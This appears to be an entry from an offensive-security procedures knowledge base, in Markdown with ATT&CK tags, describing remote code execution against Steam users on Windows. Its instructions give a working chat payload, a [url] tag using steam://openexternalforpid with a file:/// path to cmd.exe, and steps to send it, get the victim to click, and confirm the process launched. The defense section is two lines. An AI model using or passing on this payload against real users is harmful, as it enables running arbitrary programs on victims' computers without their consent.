---
tags:
  - rce
  - steam
type: procedure
tools:
  - '[[tools/Chrome-DevTools]]'
  - '[[tools/React-Developer-Tools]]'
  - '[[tools/Binary-Grep]]'
  - '[[tools/Vim]]'
  - '[[tools/Remote-Chrome-Console]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/steam-open-game]]'
  - '[[commands/steam-open-console]]'
  - '[[commands/window-top-postmessage]]'
  - '[[commands/open-steam-uri]]'
  - '[[commands/object-keys-window]]'
  - '[[commands/steam-openexternalforpid-jarfile]]'
  - '[[commands/steam-openexternalforpid-file]]'
  - '[[commands/custom-protocol-txt]]'
  - '[[commands/custom-protocol-calculator]]'
  - '[[commands/custom-protocol-jarfile-traversal]]'
  - '[[commands/custom-protocol-jarfile-path]]'
platforms:
  - Windows
techniques:
  - '[[Command-Line Interface]]'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
id: d974bc83-65d4-4fa7-8ca1-ce8eb0dfa121
created_at: '2025-12-11T06:10:18.111Z'
updated_at: '2025-12-11T06:10:18.111Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Achieve RCE via Malicious URL Tag

## Summary

This procedure combines XSS and URI abuse to send a malicious [url] tag that executes arbitrary processes like cmd.exe on the victim's machine.

## Description

The final payload uses steam://openexternalforpid with a file:/// path to launch executables without confirmation, achieving RCE via chat.

## Requirements

1. Victim must click the chat link
2. Windows victim with Steam running

## Defense

Defensive measures and detection strategies:

- Patch URI handling to require confirmation
- Monitor for anomalous process launches from Steam

## Objectives

1. Send RCE payload in chat
2. Execute arbitrary process
3. Confirm remote execution

## Instructions

### Step 1: Craft and Send Payload

**Context**: Embed RCE URI in [url] tag.

Send [url=steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe]click me[/url] using [[commands/steam-openexternalforpid-file]].

```bash
[url=steam://openexternalforpid/10400/file:///C:/Windows/cmd.exe]click me[/url]
```

> Expected: cmd.exe launches on click.

### Step 2: Validate Execution

**Context**: Confirm on victim side.

Victim clicks, and process starts without prompt.

> Expected: Successful RCE.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/steam-openexternalforpid-file]]

## Tools Used



## Tags

- [[rce]]
- [[commands/steam-open-game]]
